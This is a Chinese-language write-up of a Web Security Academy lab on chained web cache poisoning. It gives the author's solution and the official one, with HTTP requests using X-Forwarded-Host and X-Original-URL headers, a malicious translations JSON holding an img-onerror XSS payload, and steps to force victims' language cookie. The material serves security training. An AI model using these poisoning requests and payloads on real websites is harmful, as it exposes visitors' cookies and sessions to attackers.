# 实验室：组合 Web 缓存投毒漏洞

本实验室容易受到 Web 缓存投毒攻击，但前提是你必须构建一条复杂的攻击链。

一名用户大约每分钟访问一次首页，其语言设置为英语。要解决本实验室，请投毒缓存，使响应在访客浏览器中执行 `alert(document.cookie)`。


## 步骤

- 查看脚本
    ```http
    GET /resources/js/translations.js HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应
        ```js
        // 调用函数
        // initTranslations('//' + data.host + '/resources/json/translations.json');
        function initTranslations(jsonUrl) {
            // 对所有 cookie 字段进行操作，选择 cookie 字段名为 lang 并取其值
            const lang = document.cookie.split(';')
                .map(c => c.trim().split('='))
                .filter(p => p[0] === 'lang')
                .map(p => p[1])
                .find(() => true);

            // dict：JSON 字典
            // el：HTML 元素
            // 递归调用函数：
            //// 若当前 HTML 元素的内部字符匹配字典 key，则插入 key 的 value
            //// 否则，对于当前元素的所有子节点，递归调用当前函数
            //// 功能：查找 <div class="container"> 元素内的所有匹配字典项目，并取值插入 HTML 
            const translate = (dict, el) => {
                for (const k in dict) {
                    if (el.innerHTML === k) {
                        el.innerHTML = dict[k];
                    } else {
                        el.childNodes.forEach(el_ => translate(dict, el_));
                    }
                }
            }

            // 加载 JSON URL
            fetch(jsonUrl)
                .then(r => r.json())
                .then(j => {
                    // 设置 JSON 内容到语言选项，作为属性值与内部文本
                    const select = document.getElementById('lang-select');
                    if (select) {
                        for (const code in j) {
                            const name = j[code].name;
                            const el = document.createElement("option");
                            el.setAttribute("value", code);
                            el.innerText = name;
                            select.appendChild(el);
                            if (code === lang) {
                                select.selectedIndex = select.childElementCount - 1;
                            }
                        }
                    }

                    // 当 cookie 的字段 lang 值存在于 JSON 中
                    // 且 lang 值不为 en
                    // 且 JSON 中与 lang 值相同的字段包含 translations 字段
                    // 调用函数 translate()：
                    //// 参数1 translations 字段
                    //// 参数2 HTML 元素 <div class="container">
                    // 使用短路条件语句
                    lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
                });
        }
        ```
        - 若元素选择器看起来很乱，在浏览器控制台输入 JS 代码可快速确认

当前工具
- 存在 host 头注入：可控制传递到调用函数的参数 JSON URL
- 调用函数：
    - 当 cookie 字段 `lang` 的值与 JSON 拥有同名字段时，取其中字典字段 `translations` 的数据设置 HTML
        - 设置子节点 HTML 时，选择元素同名字段，取其值覆盖。此处将作为载荷的上下文
        - 对于非 `lang=en` cookie 字段成功，然而目标用户使用 en，无法进入此代码分支。需额外设置目标用户的语言 cookie

- cookie lang 字段并非缓存键，设置缓存后对所有语言 cookie 有效
- 注意投毒 JSON 后，JS 代码将提取特定字段设置语言选择表单，或需设置匹配格式（虽然不存在的字段仅设置未定义，而不会抛出异常）
- GET 访问语言设置端点即可设置语言 `/setlang/语言`

构造缓存投毒
- 攻击者端点
    `exploit-id.exploit-server.net/exploit`

- 设置攻击者端点响应头部
    ```http
    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    Access-Control-Allow-Origin: *
    ```

- 设置攻击者端点页面载荷
    ```json
    {
        "cookie_json_match": {
            "name": "payload",
            "translations": {
                "Home": "<img src onerror=alert(document.cookie)>"
            }
        }
    }
    ```

- 设置投毒请求
    - 请求1设置 cookie
        ```http
        GET / HTTP/2
        Host: id.web-security-academy.net
        X-Forwarded-Host: id.web-security-academy.net/setlang/cookie_json_match#
        ```
    - 请求2加载载荷 JSON
        ```http
        GET / HTTP/2
        Host: id.web-security-academy.net
        X-Forwarded-Host: exploit-id.exploit-server.net/exploit#
        ```

    - 仅对主页投毒即可通关，也可尝试分别对主页与包含语言查询参数的主页投毒

- 此处的 JSON URL Host 头注入，除原本的 JSON 载荷设置功能外，还抽象为任意端点 GET 原语
    - 对于 Cookie 设置端点则可任意设置 lang cookie 值

与示例解决方案的差异：
- 当前思路：仅使用 JSON URL Host 注入漏洞
    - 将所有用户的 cookie lang 设置为投毒值
    - 加载载荷 JSON 并执行代码
- 示例解决方案：额外使用请求覆盖头部
    - 投毒1，加载 JSON 载荷
    - 投毒2
        - 覆盖首页请求 URL 到无 cookie 设置的可被缓存的规范化路径 cookie 设置端点

            - 请求
                ```http
                GET / HTTP/2
                Host: id.web-security-academy.net
                X-Original-Url: /setlang\es
                ```
            - 响应
                ```http
                HTTP/2 302 Found
                Location: /setlang/es
                X-Frame-Options: SAMEORIGIN
                Cache-Control: max-age=30
                Age: 2
                X-Cache: hit
                Content-Length: 0
                ```
        - 浏览器追踪服务器端重定向到语言设置端点，设置 cookie lang 并再次重定向到设置查询参数的主页
            - 请求
                ```http
                GET /setlang/es HTTP/2
                Host: id.web-security-academy.net
                ```   

            - 响应
                ```http
                HTTP/2 302 Found
                Location: /?localized=1
                Cache-Control: private
                Set-Cookie: lang=es; Path=/; Secure
                Set-Cookie: session=F7L3NTbgGCVHRohoJDzgxRmOQJ8lSu8j; Secure; HttpOnly; SameSite=None
                X-Frame-Options: SAMEORIGIN
                X-Cache: miss
                Content-Length: 0
                ```

## 示例解决方案

本实验室要求你同时投毒多个恶意响应的缓存，并与受害者的浏览行为协同。

1. 在 Burp 开启状态下，加载网站首页。
2. 使用 [Param Miner](/web-security/web-cache-poisoning#param-miner) 识别出 `X-Forwarded-Host` 和 `X-Original-URL` 头受支持。
3. 在 Burp Repeater 中，尝试使用 `X-Forwarded-Host` 头，观察到它可用于导入任意 JSON 文件，而不是 `translations.json` 文件（该文件包含 UI 文本的翻译）。
4. 注意到该网站存在 DOM-XSS 漏洞，原因在于 `initTranslations()` 函数处理 JSON 文件数据的方式——除英语外，其他语言均受影响。
5. 进入漏洞利用服务器，将文件名改为与易受攻击网站所使用的路径相匹配：
   `/resources/json/translations.json`
6. 在头部中添加头 `Access-Control-Allow-Origin: *` 以启用 [CORS](/web-security/cors/access-control-allow-origin)。
7. 在正文中添加恶意 JSON，匹配真实翻译文件的结构。将其中一个翻译的值替换为合适的 XSS 负载，例如：
   ```json
   {
       "en": {
           "name": "English"
       },
       "es": {
           "name": "español",
           "translations": {
               "Return to list": "Volver a la lista",
               "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
               "Description:": "Descripción"
           }
       }
   }
   ```
   本解决方案的其余部分将以西班牙语演示攻击。请注意，如果你将负载注入其他语言的翻译中，你也需要相应调整示例。
8. 存储漏洞利用。
9. 在 Burp 中，查找一个包含 `lang=es` Cookie 的 `GET /?localized=1` 请求：
   `lang=es`
10. 将该请求发送至 Burp Repeater。添加缓存破坏参数和以下头，记得填入你自己的漏洞利用服务器 ID：
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
11. 发送请求，确认你的漏洞利用服务器被反射在响应中。
12. 为模拟受害者，在浏览器中加载该 URL，确认 `alert()` 被触发。
13. 你已成功投毒了西班牙语页面的缓存，但目标用户的语言设置为英语。由于无法利用语言设置为英语的用户，你需要找到强制更改其语言的方法。
14. 在 Burp 中，转到“Proxy”>“HTTP history”，查看生成的请求和响应。注意到当你在页面上将语言更改为英语以外的任何语言时，会触发重定向，例如重定向到 `/setlang/es`。用户选择的语言通过 `lang=es` Cookie 在服务器端设置，并且首页会使用参数 `?localized=1` 重新加载。
15. 将首页的 `GET` 请求发送至 Burp Repeater，并添加缓存破坏参数。
16. 观察到 `X-Original-URL` 可用于更改请求的路径，因此你可以显式设置为 `/setlang/es`。但是，你会发现此响应无法缓存，因为它包含 `Set-Cookie` 头。
17. 观察到首页有时使用反斜杠作为文件夹分隔符。注意到服务器会通过重定向将这些反斜杠规范化为正斜杠。因此，`X-Original-URL: /setlang\es` 会触发 302 响应，重定向到 `/setlang/es`。观察到该 302 响应是可缓存的，因此可用于强制其他用户访问西班牙语版本的首页。
18. 现在你需要组合这两个漏洞利用。首先，使用 `X-Forwarded-Host` 头投毒 `GET /?localized=1` 页面，以从漏洞利用服务器导入恶意 JSON 文件。
19. 然后，在缓存仍被投毒时，同时使用 `X-Original-URL: /setlang\es` 投毒 `GET /` 页面，以强制所有用户访问西班牙语页面。
20. 为模拟受害者，在浏览器中加载英语页面，确认你被重定向且 `alert()` 被触发。
21. 按顺序重放这两个请求，以保持两个页面的缓存均被投毒，直到受害者访问网站且实验室被标记为已解决。
